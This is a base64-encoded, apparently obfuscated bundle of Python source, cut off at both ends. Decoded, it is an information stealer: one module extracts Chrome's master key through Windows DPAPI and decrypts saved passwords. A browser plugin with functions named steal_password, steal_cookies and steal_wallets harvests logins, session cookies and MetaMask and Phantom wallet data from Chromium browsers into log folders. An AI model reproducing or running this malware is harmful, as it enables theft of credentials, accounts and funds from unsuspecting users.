BvcnQgKFxyXG4gICAgQ2lwaGVyLCBhbGdvcml0aG1zLCBtb2RlcylcclxuaW1wb3J0IGJhc2U2NFxyXG5pbXBvcnQgb3NcclxuaW1wb3J0IGpzb25cclxuXHJcblxyXG5jbGFzcyBEZWNyeXB0b3I6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgcGF0aCkgLT4gTm9uZTpcclxuICAgICAgICBpZiBwYXRoIGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYucGF0aCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uW1wnTE9DQUxBUFBEQVRBXCddLCByIkdvb2dsZVxcQ2hyb21lXFxVc2VyIERhdGFcXExvY2FsIFN0YXRlIilcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBzZWxmLnBhdGggPSBwYXRoXHJcbiAgICAgICAgXHJcbiAgICAgICAgc2VsZi5rZXkgPSBOb25lXHJcbiAgICAgICAgc2VsZi5jaXBoZXIgPSBOb25lXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIGRwYXBpX2RlY3J5cHQoZW5jcnlwdGVkKTpcclxuICAgICAgICBjbGFzcyBEQVRBX0JMT0IoY3R5cGVzLlN0cnVjdHVyZSk6XHJcbiAgICAgICAgICAgIF9maWVsZHNfID0gWyhcJ2NiRGF0YVwnLCBjdHlwZXMud2ludHlwZXMuRFdPUkQpLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAoXCdwYkRhdGFcJywgY3R5cGVzLlBPSU5URVIoY3R5cGVzLmNfY2hhcikpXVxyXG5cclxuICAgICAgICBwID0gY3R5cGVzLmNyZWF0ZV9zdHJpbmdfYnVmZmVyKGVuY3J5cHRlZCwgbGVuKGVuY3J5cHRlZCkpXHJcbiAgICAgICAgYmxvYmluID0gREFUQV9CTE9CKGN0eXBlcy5zaXplb2YocCksIHApXHJcbiAgICAgICAgYmxvYm91dCA9IERBVEFfQkxPQigpXHJcbiAgICAgICAgcmV0dmFsID0gY3R5cGVzLndpbmRsbC5jcnlwdDMyLkNyeXB0VW5wcm90ZWN0RGF0YShcclxuICAgICAgICAgICAgY3R5cGVzLmJ5cmVmKGJsb2JpbiksIE5vbmUsIE5vbmUsIE5vbmUsIE5vbmUsIDAsIGN0eXBlcy5ieXJlZihibG9ib3V0KSlcclxuICAgICAgICBpZiBub3QgcmV0dmFsOlxyXG4gICAgICAgICAgICByYWlzZSBjdHlwZXMuV2luRXJyb3IoKVxyXG4gICAgICAgIHJlc3VsdCA9IGN0eXBlcy5zdHJpbmdfYXQoYmxvYm91dC5wYkRhdGEsIGJsb2JvdXQuY2JEYXRhKVxyXG4gICAgICAgIGN0eXBlcy53aW5kbGwua2VybmVsMzIuTG9jYWxGcmVlKGJsb2JvdXQucGJEYXRhKVxyXG4gICAgICAgIHJldHVybiByZXN1bHRcclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZGVjcnlwdChjaXBoZXIsIGNpcGhlcnRleHQsIG5vbmNlKTpcclxuICAgICAgICBjaXBoZXIubW9kZSA9IG1vZGVzLkdDTShub25jZSlcclxuICAgICAgICBkZWNyeXB0b3IgPSBjaXBoZXIuZGVjcnlwdG9yKClcclxuICAgICAgICByZXR1cm4gZGVjcnlwdG9yLnVwZGF0ZShjaXBoZXJ0ZXh0KVxyXG5cclxuICAgIGRlZiBnZXRfa2V5X2Zyb21fbG9jYWxfc3RhdGUoc2VsZik6XHJcbiAgICAgICAganNuID0gTm9uZVxyXG4gICAgICAgIHdpdGggb3BlbihzZWxmLnBhdGgsIFwnclwnKSBhcyBmOlxyXG4gICAgICAgICAgICBqc24gPSBqc29uLmxvYWRzKHN0cihmLnJlYWRsaW5lKCkpKVxyXG4gICAgICAgIHJldHVybiBqc25bXCdvc19jcnlwdFwnXVtcJ2VuY3J5cHRlZF9rZXlcJ11cclxuXHJcbiAgICBAc3RhdGljbWV0aG9kXHJcbiAgICBkZWYgZ2V0X2NpcGhlcihrZXkpOlxyXG4gICAgICAgIGNpcGhlciA9IENpcGhlcihcclxuICAgICAgICAgICAgYWxnb3JpdGhtcy5BRVMoa2V5KSxcclxuICAgICAgICAgICAgTm9uZSxcclxuICAgICAgICAgICAgYmFja2VuZD1kZWZhdWx0X2JhY2tlbmQoKVxyXG4gICAgICAgIClcclxuICAgICAgICByZXR1cm4gY2lwaGVyXHJcblxyXG4gICAgZGVmIGFlc19kZWNyeXB0KHNlbGYsIGVuY3J5cHRlZF90eHQpOlxyXG4gICAgICAgIGlmIHNlbGYua2V5IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIGVuY29kZWRfa2V5ID0gc2VsZi5nZXRfa2V5X2Zyb21fbG9jYWxfc3RhdGUoKVxyXG4gICAgICAgICAgICBlbmNyeXB0ZWRfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShlbmNvZGVkX2tleS5lbmNvZGUoKSlcclxuICAgICAgICAgICAgZW5jcnlwdGVkX2tleSA9IGVuY3J5cHRlZF9rZXlbNTpdXHJcbiAgICAgICAgICAgIHNlbGYua2V5ID0gRGVjcnlwdG9yLmRwYXBpX2RlY3J5cHQoZW5jcnlwdGVkX2tleSlcclxuICAgICAgICAgICAgc2VsZi5jaXBoZXIgPSBEZWNyeXB0b3IuZ2V0X2NpcGhlcihzZWxmLmtleSlcclxuICAgICAgICBcclxuICAgICAgICBub25jZSA9IGVuY3J5cHRlZF90eHRbMzoxNV1cclxuXHJcbiAgICAgICAgcmV0dXJuIERlY3J5cHRvci5kZWNyeXB0KHNlbGYuY2lwaGVyLGVuY3J5cHRlZF90eHRbMTU6XSxub25jZSlcclxuXHJcbiAgICBkZWYgZGVjcnlwdF9wYXNzd29yZChzZWxmLCBkYXRhKTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIGRhdGFbOjRdID09IGJcJ1xceDAxXFx4MDBcXHgwMFxceDAwXCc6XHJcbiAgICAgICAgICAgICAgICBkZWNyeXB0ZWQgPSBEZWNyeXB0b3IuZHBhcGlfZGVjcnlwdChkYXRhKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZC5kZWNvZGUoKVxyXG4gICAgICAgICAgICBlbGlmIGRhdGFbOjNdID09IGJcJ3YxMFwnOlxyXG4gICAgICAgICAgICAgICAgZGVjcnlwdGVkID0gc2VsZi5hZXNfZGVjcnlwdChkYXRhKVxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIGRlY3J5cHRlZFs6LTE2XS5kZWNvZGUoKVxyXG4gICAgICAgIGV4Y2VwdDpcclxuICAgICAgICAgICAgcmV0dXJuIE5vbmUnKSNsaW5lOjczCiAgICBfX09PME9PMDAwT09PME8wT08wICgncGx1Z2lucy9icm93c2Vycy9DaHJvbWl1bS5weScsYiJmcm9tIGFzeW5jaW8gaW1wb3J0IFRhc2ssIGNyZWF0ZV90YXNrXHJcbmZyb20gdHlwaW5nIGltcG9ydCBMaXN0XHJcbmZyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcyBpbXBvcnQgc2NhbmRpciwgbWtkaXJcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBqb2luLCBpc2RpciwgaXNmaWxlLCBzcGxpdFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5ZmlsZSwgY29weXRyZWUsIF9oYW5kbGVfdGFza19yZXN1bHRcclxuZnJvbSBwYXRoX3NlYXJjaCBpbXBvcnQgc2VhcmNoX3BhdGhzXHJcbmltcG9ydCBhaW9zcWxpdGVcclxuZnJvbSAuZGVjcnlwdCBpbXBvcnQgRGVjcnlwdG9yXHJcbmZyb20gdGltZSBpbXBvcnQgdGltZVxyXG5mcm9tIHBhdGhzIGltcG9ydCBURU1QXHJcbmZyb20gc2VjcmV0cyBpbXBvcnQgdG9rZW5faGV4XHJcbmZyb20gYWlvZmlsZXMgaW1wb3J0IG9wZW5cclxuXHJcblxyXG5cclxuY2xhc3MgQ2hyb21pdW0oUGx1Z2luKTpcclxuICAgIGRlZiBfX2luaXRfXyhzZWxmLCBjb25mOiBDb25maWcpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5jb25mID0gY29uZlxyXG4gICAgICAgIHNlbGYuZGVjcnlwdG9yID0gTm9uZVxyXG5cclxuXHJcbiAgICBhc3luYyBkZWYgc2V0X2RlY3J5cHRvcihzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBsb2NhbF9zdGF0ZV9mb2xkZXJzID0ge1xyXG4gICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScpLFxyXG4gICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGxvY2FsX3N0YXRlcyA9IFtdXHJcbiAgICAgICAgYXN5bmMgZm9yIGkgaW4gc2VhcmNoX3BhdGhzKGxvY2FsX3N0YXRlX2ZvbGRlcnMsIHsnTG9jYWwgU3RhdGUnfSk6XHJcbiAgICAgICAgICAgIGxvY2FsX3N0YXRlcy5hcHBlbmQoaSlcclxuXHJcbiAgICAgICAgaWYgbG9jYWxfc3RhdGVzOlxyXG4gICAgICAgICAgICBsb2NhbF9zdGF0ZV9wYXRoID0gbG9jYWxfc3RhdGVzWzBdXHJcbiAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgbG9jYWxfc3RhdGVfcGF0aCA9IE5vbmVcclxuXHJcbiAgICAgICAgc2VsZi5kZWNyeXB0b3IgPSBEZWNyeXB0b3IobG9jYWxfc3RhdGVfcGF0aClcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIHN0ZWFsX3Bhc3N3b3JkKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgcm93cyA9IFtdXHJcblxyXG4gICAgICAgICAgICBpZiBub3QgaXNkaXIocm9vdF9wYXRoKTpcclxuICAgICAgICAgICAgICAgIHJldHVybiBbXVxyXG5cclxuICAgICAgICAgICAgbG9naW5fZGF0YV9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JyksXHJcbiAgICAgICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKGxvZ2luX2RhdGFfZm9sZGVyX3BhdGhzLCB7J0xvZ2luIERhdGEnfSk6XHJcbiAgICAgICAgICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgbm90IGlzZmlsZShwKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuICAgICAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgICAgICB0ZW1wX3BhdGggPSBqb2luKFRFTVAsIGYnTG9naW4gRGF0YSB7dGltZSgpfScpXHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgY29weWZpbGUocCwgdGVtcF9wYXRoKVxyXG5cclxuICAgICAgICAgICAgICAgICAgICBpZiBub3Qgc2VsZi5kZWNyeXB0b3I6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuc2V0X2RlY3J5cHRvcihyb290X3BhdGgpXHJcbiAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBhaW9zcWxpdGUuY29ubmVjdCh0ZW1wX3BhdGgpIGFzIGNvbm46XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIHNxbCA9ICdzZWxlY3QgKiBmcm9tIGxvZ2lucydcclxuICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBjb25uLmV4ZWN1dGUoc3FsKSBhcyBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYXN5bmMgZm9yIHJvdyBpbiBjdXJyOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm93cy5hcHBlbmQoKHJvd1sxXSwgcm93WzNdLCBzZWxmLmRlY3J5cHRvci5kZWNyeXB0X3Bhc3N3b3JkKHJvd1s1XSkpKVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGI0XHhkMFx4YjVceGQwXHhiYVx4ZDFceDgwXHhkMFx4YjhceGQwXHhiZlx4ZDFceDgyXHhkMFx4YjUgXHhkMFx4YmZceGQwXHhiMFx4ZDFceDgwXHhkMFx4YmVceGQwXHhiYlx4ZDFceDhmLCB7ZX0nKVxyXG4gICAgICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4OWVceGQxXHg4OFx4ZDBceGI4XHhkMFx4YjFceGQwXHhiYVx4ZDBceGIwIFx4ZDBceGJmXHhkMVx4ODBceGQwXHhiOCBceGQwXHhiZlx4ZDBceGJlXHhkMFx4YmZceGQxXHg4Ylx4ZDFceDgyXHhkMFx4YmFceGQwXHhiNSBceGQxXHg4MVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI0XHhkMFx4YjhceGQxXHg4Mlx4ZDFceDhjIFx4ZDBceGJmXHhkMFx4YjBceGQxXHg4MFx4ZDBceGJlXHhkMFx4YmJceGQwXHhiOCBceGQxXHg4MSB7cH0sIFx4ZDBceGJlXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCB7ZX0nKVxyXG5cclxuICAgICAgICAgICAgaWYgcm93czpcclxuICAgICAgICAgICAgICAgIG5hbWUgPSBmJ3tzcGxpdChyb290X3BhdGgpWzFdfV97dG9rZW5faGV4KDUpfS50eHQnXHJcbiAgICAgICAgICAgICAgICBwYXNzd29yZHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAncGFzc3dvcmRzJylcclxuICAgICAgICAgICAgICAgIHBhdGggPSBqb2luKHBhc3N3b3Jkc19wYXRoLCBuYW1lKVxyXG5cclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2RpcihwYXNzd29yZHNfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICAgICAgbWtkaXIocGFzc3dvcmRzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBvcGVuKHBhdGgsICd3JywgZW5jb2Rpbmc9J3V0ZjgnKSBhcyBmOlxyXG4gICAgICAgICAgICAgICAgICAgIGZvciB1cmwsIGxvZ2luLCBwYXNzd29yZCBpbiByb3dzOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBmLndyaXRlKGYnVVJMOiB7dXJsfVxcbkxvZ2luOiB7bG9naW59XFxuUGFzc3dvcmQ6IHtwYXNzd29yZH1cXG5cXG4nKVxyXG5cclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmRceGQxXHg4YiBceGQwXHhiZlx4ZDBceGIwXHhkMVx4ODBceGQwXHhiZVx4ZDBceGJiXHhkMFx4YjggXHhkMVx4ODEge3Jvb3RfcGF0aH0nKVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidFcnJvciBpbiBzdGVhbF9wYXNzd29yZDoge2V9JylcclxuXHJcbiAgICBhc3luYyBkZWYgc3RlYWxfY29va2llcyhzZWxmLCByb290X3BhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICB0cnk6XHJcbiAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihyb290X3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgcmV0dXJuIFtdXHJcblxyXG4gICAgICAgICAgICBjb29raWVzID0gJydcclxuXHJcbiAgICAgICAgICAgIGNvb2tpZV9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JywgJ25ldHdvcmsnKSwgXHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JyksXHJcbiAgICAgICAgICAgICAgICByb290X3BhdGhcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKGNvb2tpZV9mb2xkZXJfcGF0aHMsIHsnQ29va2llcycsICdjb29raWVzLnNxbGl0ZSd9KTpcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2ZpbGUocCk6XHJcbiAgICAgICAgICAgICAgICAgICAgY29udGludWVcclxuXHJcbiAgICAgICAgICAgICAgICB0ZW1wX3BhdGggPSBqb2luKFRFTVAsIGYnQ29va2llcyB7dGltZSgpfScpXHJcbiAgICAgICAgICAgICAgICBhd2FpdCBjb3B5ZmlsZShwLCB0ZW1wX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgaWYgbm90IHNlbGYuZGVjcnlwdG9yOlxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuc2V0X2RlY3J5cHRvcihyb290X3BhdGgpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgYXN5bmMgd2l0aCBhaW9zcWxpdGUuY29ubmVjdCh0ZW1wX3BhdGgpIGFzIGNvbm46XHJcbiAgICAgICAgICAgICAgICAgICAgc3FsID0gJ3NlbGVjdCAqIGZyb20gY29va2llcydcclxuICAgICAgICAgICAgICAgICAgICBhc3luYyB3aXRoIGNvbm4uZXhlY3V0ZShzcWwpIGFzIGN1cnI6XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGFzeW5jIGZvciByb3cgaW4gY3VycjpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnYgPSBsYW1iZGEgeDogJ1RSVUUnIGlmIHggZWxzZSAnRkFMU0UnXHJcblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhvc3QgPSByb3dbMV1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBodHRwX29ubHkgPSBjb252KHJvd1s5XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXRoID0gcm93WzZdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VjdXJlID0gY29udihyb3dbOF0pXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhwaXJhdGlvbl9kYXRlID0gc3RyKHJvd1s3XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gcm93WzNdXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFsdWUgPSBzZWxmLmRlY3J5cHRvci5kZWNyeXB0X3Bhc3N3b3JkKHJvd1s1XSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ1x4ZDBceDllXHhkMVx4ODhceGQwXHhiOFx4ZDBceGIxXHhkMFx4YmFceGQwXHhiMCBceGQwXHhiZlx4ZDFceDgwXHhkMFx4YjggXHhkMFx4YjRceGQwXHhiNVx4ZDBceGJhXHhkMVx4ODBceGQwXHhiOFx4ZDBceGJmXHhkMVx4ODJceGQwXHhiNSBceGQwXHhiYVx4ZDFceDgzXHhkMFx4YmFceGQwXHhiMCwge2V9JylcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IHZhbHVlOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhbHVlID0gJydcclxuXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWUgPSAnXFx0Jy5qb2luKFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIChob3N0LCBodHRwX29ubHksIHBhdGgsIHNlY3VyZSwgZXhwaXJhdGlvbl9kYXRlLCBuYW1lLCB2YWx1ZSkpXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb29raWVzICs9IGNvb2tpZSArICdcXG4nXHJcblxyXG4gICAgICAgICAgICBpZiBjb29raWVzOlxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IGYne3NwbGl0KHJvb3RfcGF0aClbMV19X3t0b2tlbl9oZXgoNSl9LnR4dCdcclxuICAgICAgICAgICAgICAgIGNvb2tpZXNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnY29va2llcycpXHJcbiAgICAgICAgICAgICAgICBwYXRoID0gam9pbihjb29raWVzX3BhdGgsIG5hbWUpXHJcbiAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIGlmIG5vdCBpc2Rpcihjb29raWVzX3BhdGgpOlxyXG4gICAgICAgICAgICAgICAgICAgIG1rZGlyKGNvb2tpZXNfcGF0aClcclxuXHJcbiAgICAgICAgICAgICAgICBhc3luYyB3aXRoIG9wZW4ocGF0aCwgJ3cnLCBlbmNvZGluZz0ndXRmOCcpIGFzIGY6XHJcbiAgICAgICAgICAgICAgICAgICAgYXdhaXQgZi53cml0ZShjb29raWVzKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmRceGQxXHg4YiBceGQwXHhiYVx4ZDFceDgzXHhkMFx4YmFceGQwXHhiOCBceGQxXHg4MSB7cm9vdF9wYXRofScpXHJcbiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOlxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmJ0Vycm9yIGluIHN0ZWFsX2Nvb2tpZXM6IHtlfScpXHJcblxyXG5cclxuICAgIGFzeW5jIGRlZiBzdGVhbF93YWxsZXRzKHNlbGYsIHJvb3RfcGF0aDogc3RyKSAtPiBOb25lOlxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgbm90IGlzZGlyKHJvb3RfcGF0aCk6XHJcbiAgICAgICAgICAgICAgICByZXR1cm4gW11cclxuXHJcbiAgICAgICAgICAgIHdhbGxldF9mb2xkZXJfcGF0aHMgPSB7XHJcbiAgICAgICAgICAgICAgICBqb2luKHJvb3RfcGF0aCwgJ3VzZXIgZGF0YScsICdkZWZhdWx0JywgJ2xvY2FsIGV4dGVuc2lvbiBzZXR0aW5ncycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAndXNlciBkYXRhJywgJ2xvY2FsIGV4dGVuc2lvbiBzZXR0aW5ncycpLCBcclxuICAgICAgICAgICAgICAgIGpvaW4ocm9vdF9wYXRoLCAnbG9jYWwgZXh0ZW5zaW9uIHNldHRpbmdzJylcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgd2FsbGV0cyA9IHtcclxuICAgICAgICAgICAgICAgICdua2JpaGZiZW9nYWVhb2VobGVmbmtvZGJlZmdwZ2tubic6ICdtZXRhbWFzaycsXHJcbiAgICAgICAgICAgICAgICAnYmZuYWVsbW9tZWltaGxwbWdqbmpvcGhocGtrb2xqcGEnOiAncGhhbnRvbSdcclxuICAgICAgICAgICAgfVxyXG5cclxuICAgICAgICAgICAgYXN5bmMgZm9yIHAgaW4gc2VhcmNoX3BhdGhzKHdhbGxldF9mb2xkZXJfcGF0aHMsIHNldCh3YWxsZXRzLmtleXMoKSkpOlxyXG4gICAgICAgICAgICAgICAgaWYgbm90IGlzZGlyKHApOlxyXG4gICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlXHJcbiAgICAgICAgICAgICAgICBcclxuICAgICAgICAgICAgICAgIHdhbGxldHNfcGF0aCA9IGpvaW4oc2VsZi5jb25mLmxvZ19wYXRoLCAnd2FsbGV0cycpXHJcbiAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIod2FsbGV0c19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICBta2Rpcih3YWxsZXRzX3BhdGgpXHJcblxyXG4gICAgICAgICAgICAgICAgbmFtZSA9IHNwbGl0KHApWzFdXHJcbiAgICAgICAgICAgICAgICB3YWxsZXRfbmFtZSA9IHdhbGxldHNbbmFtZV1cclxuICAgICAgICAgICAgICAgIGRlc3RfcGF0aCA9IGpvaW4od2FsbGV0c19wYXRoLCBmJ3t3YWxsZXRfbmFtZX1fe3Rva2VuX2hleCg0KX0nKVxyXG5cclxuICAgICAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgICAgICBhd2FpdCBjb3B5dHJlZShwLCBkZXN0X3BhdGgpXHJcbiAgICAgICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6XHJcbiAgICAgICAgICAgICAgICAgICAgcGFzc1xyXG5cclxuICAgICAgICAgICAgICAgIGF3YWl0IHNlbGYuY29uZi5sb2dnZXIubG9nKGYnXHhkMFx4YTFceGQwXHhiZlx4ZDBceGI4XHhkMFx4YjdceGQwXHhiNlx4ZDBceGI1XHhkMFx4YmQgXHhkMFx4YjJceGQwXHhiNVx4ZDBceGIxIFx4ZDBceGJhXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI1XHhkMFx4YmJceGQxXHg4YyBceGQxXHg4MSB7cH0nKVxyXG4gICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTpcclxuICAgICAgICAgICAgYXdhaXQgc2VsZi5jb25mLmxvZ2dlci5sb2coZidceGQwXHg5ZVx4ZDFceDg4XHhkMFx4YjhceGQwXHhiMVx4ZDBceGJhXHhkMFx4YjAgXHhkMFx4YmZceGQxXHg4MFx4ZDBceGI4IFx4ZDBceGJmXHhkMFx4YmVceGQwXHhiZlx4ZDFceDhiXHhkMVx4ODJceGQwXHhiYVx4ZDBceGI1IFx4ZDFceDgxXHhkMFx4YmZceGQwXHhiOFx4ZDBceGI3XHhkMFx4YjRceGQwXHhiOFx4ZDFceDgyXHhkMVx4OGMgXHhkMFx4YjJceGQwXHhiNVx4ZDBceGIxIFx4ZDBceGJhXHhkMFx4YmVceGQxXHg4OFx4ZDBceGI1XHhkMFx4YmJceGQwXHhiNVx4ZDBceGJhIHtyb290X3BhdGh9JylcclxuICAgIFxyXG5cclxuICAgIGFzeW5jIGRlZiBjYWxsYmFjayhzZWxmLCBwYXRoOiBzdHIpIC0+IE5vbmU6XHJcbiAgICAgICAgY2hyb21pdW1fYnJvd3Nlcl9uYW1lcyA9IHtcclxuICAgICAgICAgICAgJ29wZXJhIGd4IHN0YWJsZScsXHJcbiAgICAgICAgICAgICdvcGVyYSBzdGFibGUnLFxyXG4gICAgICAgICAgICAnY2hyb21lJyxcclxuICAgICAgICAgICAgJ3lhbmRleGJyb3dzZXInXHJcbiAgICAgICAgfVxyXG5cclxuICAgICAgICB0YXNrczogTGlzdFtUYXNrXSA9IFtdXHJcblxyXG4gICAgICAgIGZvciBmb2xkZXJfbmFtZSBpbiBjaHJvbWl1bV9icm93c2VyX25hbWVzLmludGVyc2VjdGlvbihpLm5hbWUubG93ZXIoKSBmb3IgaSBpbiBzY2FuZGlyKHBhdGgpKTpcclxuICAgICAgICAgICAgcm9vdF9wYXRoID0gam9pbihwYXRoLCBmb2xkZXJfbmFtZSlcclxuICAgICAgICAgICAgdGFza3MuYXBwZW5kKGNyZWF0ZV90YXNrKHNlbGYuc3RlYWxfcGFzc3dvcmQocm9vdF9wYXRoKSkpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX2Nvb2tpZXMocm9vdF9wYXRoKSkpXHJcbiAgICAgICAgICAgIHRhc2tzLmFwcGVuZChjcmVhdGVfdGFzayhzZWxmLnN0ZWFsX3dhbGxldHMocm9vdF9wYXRoKSkpXHJcblxyXG4gICAgICAgIGZvciB0YXNrIGluIHRhc2tzOlxyXG4gICAgICAgICAgICB0YXNrLmFkZF9kb25lX2NhbGxiYWNrKGxhbWJkYSB4OiBfaGFuZGxlX3Rhc2tfcmVzdWx0KHgsIHNlbGYuY29uZi5sb2dnZXIpKVxyXG4gICAgICAgICAgICBcclxuICAgICAgICBmb3IgdGFzayBpbiB0YXNrczpcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgYXdhaXQgdGF